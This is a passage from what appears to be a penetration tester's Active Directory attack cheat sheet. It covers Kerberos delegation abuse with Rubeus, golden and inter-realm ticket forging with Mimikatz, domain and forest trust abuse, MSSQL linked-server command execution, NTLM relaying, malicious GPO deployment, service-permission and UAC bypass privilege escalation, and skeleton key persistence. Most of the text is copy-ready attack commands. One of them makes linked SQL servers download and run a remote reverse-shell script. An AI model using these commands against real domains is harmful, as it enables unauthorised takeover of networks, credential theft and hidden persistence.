</span></span></code></pre></div><h3 id=constrained-delegation>Constrained delegation</h3><p>Constrained delegation can be set on the <em>frontend server</em> (e.g. IIS) to allow it to delegate to <em>only selected backend services</em> (e.g. MSSQL) on behalf of the user.</p><p>DACL UAC property: <code>TrustedToAuthForDelegation</code>. This allows <code>s4u2self</code>, i.e. requesting a TGS on behalf of <em>anyone</em> to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn&rsquo;t used between the user and frontend.</p><p>DACL Property: <code>msDS-AllowedToDelegateTo</code>. This property contains the SPNs it is allowed to use <code>s4u2proxy</code> on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using <code>s4u2self</code>). This effectively defines the backend services that constrained delegation is allowed for.</p><p><strong>NOTE:</strong> These properties do NOT have to exist together! If <code>s4u2proxy</code> is allowed without <code>s4u2self</code>, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.</p><h4 id=exploitation-1>Exploitation</h4><p>In this case, we use Rubeus to automatically request a TGT and then a TGS with the <code>ldap</code> SPN to allow us to DCSync using a machine account.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)</span>
</span></span><span style=display:flex><span>.\Rubeus.exe asktgt /user<span style=color:#a61717;background-color:#e3d2d2>:</span>svc_with_delegation /domain<span style=color:#a61717;background-color:#e3d2d2>:</span>targetdomain.com /rc4<span style=color:#a61717;background-color:#e3d2d2>:</span>2892D26CDF84D7A70E2EB3B9F05C425E
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span>
</span></span><span style=display:flex><span>.\Rubeus.exe s4u /ticket<span style=color:#a61717;background-color:#e3d2d2>:</span>doIE+jCCBP... /impersonateuser<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /msdsspn<span style=color:#a61717;background-color:#e3d2d2>:</span>time/dc /ptt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)</span>
</span></span><span style=display:flex><span>.\Rubeus.exe s4u /user<span style=color:#a61717;background-color:#e3d2d2>:</span>sa_with_delegation /impersonateuser<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /msdsspn<span style=color:#a61717;background-color:#e3d2d2>:</span>time/dc /altservice<span style=color:#a61717;background-color:#e3d2d2>:</span>ldap /ptt /rc4<span style=color:#a61717;background-color:#e3d2d2>:</span>2892D26CDF84D7A70E2EB3B9F05C425E
</span></span></code></pre></div><h3 id=resource-based-constrained-delegation>Resource-based constrained delegation</h3><p>Resource-Based Constrained Delegation (RBCD) configures the <em>backend server</em> (e.g. MSSQL) to allow <em>only selected frontend services</em> (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.</p><p>DACL Property: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p><p>In this scenario, <code>s4u2self</code> and <code>s4u2proxy</code> are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the <em>frontend service</em>) is present in the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property of the <em>backend service</em>. This means that the <em>frontend service</em> needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.</p><h4 id=exploitation-2>Exploitation</h4><p>If we compromise a <em>frontend service</em> that appears in the RBCD property of a <em>backend service</em>, exploitation is the same as with constrained delegation above. This is however not too common.</p><p>A more often-seen attack to RBCD is when we have <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code> permissions to a computer object in the domain. This means we can write the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Create a new machine account using PowerMad</span>
</span></span><span style=display:flex><span><span style=color:#24909d>New-MachineAccount</span> -MachineAccount NewMachine -Password $(<span style=color:#24909d>ConvertTo-SecureString</span> <span style=color:#ed9d13>&#39;P4ssword123!&#39;</span> -AsPlainText -Force)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$sid</span> = <span style=color:#24909d>Get-DomainComputer</span> -Identity NewMachine -Properties objectsid | <span style=color:#24909d>Select </span>-Expand objectsid
</span></span><span style=display:flex><span><span style=color:#40ffff>$SD</span> = <span style=color:#24909d>New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style=color:#ed9d13>&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span>$(<span style=color:#40ffff>$sid</span>)<span style=color:#ed9d13>)&#34;</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$SDbytes</span> = <span style=color:#24909d>New-Object</span> byte[] (<span style=color:#40ffff>$SD</span>.BinaryLength)
</span></span><span style=display:flex><span><span style=color:#40ffff>$SD</span>.GetBinaryForm(<span style=color:#40ffff>$SDbytes</span>,<span style=color:#3677a9>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainComputer</span> -Identity TargetSrv | <span style=color:#24909d>Set-DomainObject</span> -Set @{<span style=color:#ed9d13>&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=<span style=color:#40ffff>$SDBytes</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span>
</span></span><span style=display:flex><span>.\Rubeus.exe s4u /user<span style=color:#a61717;background-color:#e3d2d2>:</span>NewMachine$ /rc4<span style=color:#a61717;background-color:#e3d2d2>:</span>A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /msdsspn<span style=color:#a61717;background-color:#e3d2d2>:</span>CIFS/TargetSrv.targetdomain.com /ptt
</span></span></code></pre></div><h3 id=abusing-domain-trust>Abusing domain trust</h3><p>All commands must be run with DA privileges in the current domain.</p><p>Note that if you completely compromise a child domain (<code>currentdomain.targetdomain.com</code>), you can <em>by definition</em> also compromise the parent domain (<code>targetdomain.com</code>) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see <a href=#abusing-inter-forest-trust>&lsquo;Abusing inter-forest trust&rsquo;</a> below).</p><h4 id=using-domain-trust-key>Using domain trust key</h4><p>From the DC, dump the hash of the <code>currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain&rsquo;s enterprise admins group to our &lsquo;SID history&rsquo;.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
</span></span></code></pre></div><p>Pass this ticket with Rubeus.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\Rubeus.exe asktgs /ticket<span style=color:#a61717;background-color:#e3d2d2>:</span>c:\users\public\ticket.kirbi /service<span style=color:#a61717;background-color:#e3d2d2>:</span>LDAP/dc.targetdomain.com /dc<span style=color:#a61717;background-color:#e3d2d2>:</span>dc.targetdomain.com /ptt
</span></span></code></pre></div><p>We can now DCSync the target domain (see below).</p><h4 id=using-krbtgt-hash>Using krbtgt hash</h4><p>From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.</p><p>Doing this requires the SID of the current domain as the <code>/sid</code> parameter, and the SID of the target domain as part of the <code>/sids</code> parameter. You can grab these using PowerView&rsquo;s <code>Get-DomainSID</code>. Use a SID History (<code>/sids</code>) of <code>*-516</code> and <code>S-1-5-9</code> to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt
</span></span></code></pre></div><blockquote><p>If you are having issues creating this ticket, try adding the &rsquo;target&rsquo; flag, e.g. <code>/target:targetdomain.com</code>.</p></blockquote><p>Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.</p><pre tabindex=0><code>kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
</code></pre><p>We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.</p><h3 id=abusing-inter-forest-trust>Abusing inter-forest trust</h3><p>Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-DomainForeignGroupMember</span> -domain targetdomain.com
</span></span></code></pre></div><p>In some cases, it is possible that SID filtering (the protection causing the above), is <em>disabled</em> between forests. If you run <code>Get-DomainTrust</code> and you see the <code>TREAT_AS_EXTERNAL</code> property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can <em>NOT</em> forge a ticket for any SID between 500 and 1000 though, so you can&rsquo;t become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to <a href=https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/>this blog post</a>.</p><p>To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in <a href=#using-domain-trust-key>&lsquo;Using domain trust key&rsquo;</a> above.</p><p>Use Mimikatz to generate a TGT for the target domain using the trust key:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi
</span></span></code></pre></div><p>Then, use Rubeus to ask a TGS for e.g. the <code>CIFS</code> service on the target DC using this TGT.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\Rubeus.exe asktgs /ticket<span style=color:#a61717;background-color:#e3d2d2>:</span>c:\ad\tools\<span style=color:#24909d>eucorp-tgt</span>.kirbi /service<span style=color:#a61717;background-color:#e3d2d2>:</span>CIFS/<span style=color:#24909d>eurocorp-dc</span>.eurocorp.local /dc<span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#24909d>eurocorp-dc</span>.eurocorp.local /ptt
</span></span></code></pre></div><p>Now we can use the CIFS service on the target forest&rsquo;s DC as the DA of our source domain (again, as long as this trust was configured to exist).</p><h3 id=abusing-mssql-databases-for-lateral-movement>Abusing MSSQL databases for lateral movement</h3><p>MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (<code>sa</code> maybe? ðŸ˜™). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#999;font-style:italic>-- Find linked servers
</span></span></span><span style=display:flex><span><span style=color:#999;font-style:italic></span><span style=color:#6ab825;font-weight:700>EXEC</span><span style=color:#666> </span>sp_linkedservers<span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666></span><span style=color:#999;font-style:italic>-- Run SQL query on linked server
</span></span></span><span style=display:flex><span><span style=color:#999;font-style:italic></span><span style=color:#6ab825;font-weight:700>select</span><span style=color:#666> </span>mylogin<span style=color:#666> </span><span style=color:#6ab825;font-weight:700>from</span><span style=color:#666> </span>openquery(<span style=color:#ed9d13>&#34;TARGETSERVER&#34;</span>,<span style=color:#666> </span><span style=color:#ed9d13>&#39;select SYSTEM_USER as mylogin&#39;</span>)<span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666></span><span style=color:#999;font-style:italic>-- Enable &#39;xp_cmdshell&#39; on remote server and execute commands, only works if RPC is enabled
</span></span></span><span style=display:flex><span><span style=color:#999;font-style:italic></span><span style=color:#6ab825;font-weight:700>EXEC</span><span style=color:#666> </span>(<span style=color:#ed9d13>&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure&#39;</span>)<span style=color:#666> </span><span style=color:#6ab825;font-weight:700>AT</span><span style=color:#666> </span>TARGETSERVER<span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666></span><span style=color:#6ab825;font-weight:700>EXEC</span><span style=color:#666> </span>(<span style=color:#ed9d13>&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure&#39;</span>)<span style=color:#666> </span><span style=color:#6ab825;font-weight:700>AT</span><span style=color:#666> </span>TARGETSERVER<span style=color:#666>
</span></span></span><span style=display:flex><span><span style=color:#666></span><span style=color:#6ab825;font-weight:700>EXEC</span><span style=color:#666> </span>(<span style=color:#ed9d13>&#39;xp_cmdshell &#39;&#39;whoami&#39;&#39; &#39;</span>)<span style=color:#666> </span><span style=color:#6ab825;font-weight:700>AT</span><span style=color:#666> </span>TARGETSERVER<span style=color:#666>
</span></span></span></code></pre></div><p>We can also use <a href=https://github.com/NetSPI/PowerUpSQL>PowerUpSQL</a> to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Get MSSQL databases in the domain, and test connectivity</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SQLInstanceDomain</span> | <span style=color:#24909d>Get-SQLConnectionTestThreaded</span> | <span style=color:#24909d>ft
</span></span></span><span style=display:flex><span><span style=color:#24909d></span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Try to get information on all domain databases</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SQLInstanceDomain</span> | <span style=color:#24909d>Get-SQLServerInfo</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get information on a single reachable database</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SQLServerInfo</span> -Instance TARGETSERVER
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Scan for MSSQL misconfigurations to escalate to SA</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-SQLAudit</span> -Verbose -Instance TARGETSERVER
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Execute SQL query</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SQLQuery</span> -Query <span style=color:#ed9d13>&#34;SELECT system_user&#34;</span> -Instance TARGETSERVER
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Run command (enables XP_CMDSHELL automatically if required)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-SQLOSCmd</span> -Instance TARGETSERVER -Command <span style=color:#ed9d13>&#34;whoami&#34;</span> |  <span style=color:#24909d>select </span>-ExpandProperty CommandResults
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Automatically find all linked databases</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SqlServerLinkCrawl</span> -Instance TARGETSERVER | <span style=color:#24909d>select </span>instance,links | <span style=color:#24909d>ft
</span></span></span><span style=display:flex><span><span style=color:#24909d></span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Run command if XP_CMDSHELL is enabled on any of the linked databases</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SqlServerLinkCrawl</span> -Instance TARGETSERVER -Query <span style=color:#ed9d13>&#39;EXEC xp_cmdshell &#34;whoami&#34;&#39;</span> | <span style=color:#24909d>select </span>instance,links,customquery | <span style=color:#24909d>ft
</span></span></span><span style=display:flex><span><span style=color:#24909d></span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-SqlServerLinkCrawl</span> -Instance TARGETSERVER -Query <span style=color:#ed9d13>&#39;EXEC xp_cmdshell &#34;powershell.exe -c iex (new-object net.webclient).downloadstring(&#39;&#39;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#39;&#39;)&#34;&#39;</span> | <span style=color:#24909d>select </span>instance,links,customquery | <span style=color:#24909d>ft
</span></span></span></code></pre></div><p>If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the <code>xp_dirtree</code> stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#6ab825;font-weight:700>EXEC</span><span style=color:#666> </span>master..xp_dirtree<span style=color:#666> </span><span style=color:#ed9d13>&#34;\\192.168.49.67\share&#34;</span><span style=color:#666>
</span></span></span></code></pre></div><p>Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run <code>calc.exe</code>. Omit the <code>-c</code> parameter to attempt a <code>secretsdump</code> instead.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span style=color:#ed9d13>&#39;calc.exe&#39;</span>
</span></span></code></pre></div><h3 id=abusing-group-policy-objects-for-lateral-movement>Abusing Group Policy Objects for lateral movement</h3><p>If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to <a href=#ad-enumeration-with-powerview>&lsquo;AD Enumeration With PowerView&rsquo;</a>), we can abuse these privileges to move laterally towards other machines.</p><p>As an example, we can use the legitimate <a href=https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools>Remote System Administration Tools</a> (RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Create a new GPO and link it to the target server</span>
</span></span><span style=display:flex><span><span style=color:#24909d>New-GPO</span> -Name <span style=color:#ed9d13>&#39;Totally Legit GPO&#39;</span> | <span style=color:#24909d>New-GPLink</span> -Target <span style=color:#ed9d13>&#39;OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Link an existing GPO to another target server</span>
</span></span><span style=display:flex><span><span style=color:#24909d>New-GPLink</span> -Target <span style=color:#ed9d13>&#39;OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com&#39;</span> -Name <span style=color:#ed9d13>&#39;Totally Legit GPO&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Deploy a registry runkey via the GPO</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Set-GPPrefRegistryValue</span> -Name <span style=color:#ed9d13>&#39;Totally Legit GPO&#39;</span> -Context Computer -Action Create -Key <span style=color:#ed9d13>&#39;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span> -ValueName <span style=color:#ed9d13>&#39;Updater&#39;</span> -Value <span style=color:#ed9d13>&#39;cmd.exe /c calc.exe&#39;</span> -Type ExpandString
</span></span></code></pre></div><p>We can also use <a href=https://github.com/FSecureLABS/SharpGPOAbuse>SharpGPOAbuse</a> to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1-2 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>SharpGPOAbuse.exe --AddComputerTask --TaskName <span style=color:#ed9d13>&#34;Microsoft LEGITIMATE Hotfix&#34;</span> --Author NT AUTHORITY\SYSTEM --Command <span style=color:#ed9d13>&#34;cmd.exe&#34;</span> --Arguments <span style=color:#ed9d13>&#34;/c start calc.exe&#34;</span> --GPOName <span style=color:#ed9d13>&#34;Totally Legit GPO&#34;</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>For more things to look for (both Windows and Linux), refer to my <a href=https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>OSCP cheat sheet and command reference</a>.</p><h3 id=powerup>PowerUp</h3><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Check for vulnerable programs and configs</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-AllChecks</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Exploit vulnerable service permissions (does not require touching disk)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-ServiceAbuse</span> -Name <span style=color:#ed9d13>&#34;VulnerableSvc&#34;</span> -Command <span style=color:#ed9d13>&#34;net localgroup Administrators DOMAIN\user /add&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Exploit an unquoted service path vulnerability to spawn a beacon</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Write-ServiceBinary</span> -Name <span style=color:#ed9d13>&#39;VulnerableSvc&#39;</span> -Command <span style=color:#ed9d13>&#39;c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update&#39;</span> -Path <span style=color:#ed9d13>&#39;C:\Program Files\VulnerableSvc&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Restart the service to exploit (not always required)</span>
</span></span><span style=display:flex><span>net.exe stop VulnerableSvc
</span></span><span style=display:flex><span>net.exe <span style=color:#24909d>start </span>VulnerableSvc
</span></span></code></pre></div><h3 id=uac-bypass>UAC Bypass</h3><p>Using <a href=https://github.com/FatRodzianko/SharpBypassUAC>SharpBypassUAC</a>.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#999;font-style:italic># Generate EncodedCommand</span>
</span></span><span style=display:flex><span><span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#39;cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update&#39;</span> | base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Use SharpBypassUAC e.g. from a CobaltStrike beacon</span>
</span></span><span style=display:flex><span>beacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e <span style=color:#40ffff>Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ</span>==
</span></span></code></pre></div><p>In some cases, you may get away better with running a manual UAC bypass, such as the FODHelper bypass which is quite simple to execute in PowerShell.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># The command to execute in high integrity context</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$cmd</span> = <span style=color:#ed9d13>&#34;cmd /c start powershell.exe&#34;</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Set the registry values</span>
</span></span><span style=display:flex><span><span style=color:#24909d>New-Item</span> <span style=color:#ed9d13>&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Force
</span></span><span style=display:flex><span><span style=color:#24909d>New-ItemProperty</span> -Path <span style=color:#ed9d13>&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Name <span style=color:#ed9d13>&#34;DelegateExecute&#34;</span> -Value <span style=color:#ed9d13>&#34;&#34;</span> -Force
</span></span><span style=display:flex><span><span style=color:#24909d>Set-ItemProperty</span> -Path <span style=color:#ed9d13>&#34;HKCU:\Software\Classes\ms-settings\Shell\Open\command&#34;</span> -Name <span style=color:#ed9d13>&#34;(default)&#34;</span> -Value <span style=color:#40ffff>$cmd</span> -Force
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Trigger fodhelper to perform the bypass</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Start-Process</span> <span style=color:#ed9d13>&#34;C:\Windows\System32\fodhelper.exe&#34;</span> -WindowStyle Hidden
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Clean registry</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Start-Sleep</span> <span style=color:#3677a9>3</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Remove-Item</span> <span style=color:#ed9d13>&#34;HKCU:\Software\Classes\ms-settings\&#34;</span> -Recurse -Force
</span></span></code></pre></div><h2 id=persistence>Persistence</h2><h3 id=startup-folder>Startup folder</h3><p>Just drop a binary. Classic. ðŸ˜ŽðŸš©</p><p>In current user folder, will trigger when current user signs in:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
</span></span></code></pre></div><p>Or in the global startup folder, requires administrative privileges but will trigger as SYSTEM on boot <em>and</em> in a user context whenever any user signs in:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
</span></span></code></pre></div><h2 id=domain-persistence>Domain Persistence</h2><p>Must be run with DA privileges.</p><h3 id=mimikatz-skeleton-key-attack>Mimikatz skeleton key attack</h3><p>Run from DC. Enables password &ldquo;mimikatz&rdquo; for all users. ðŸš©</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>misc::skeleton
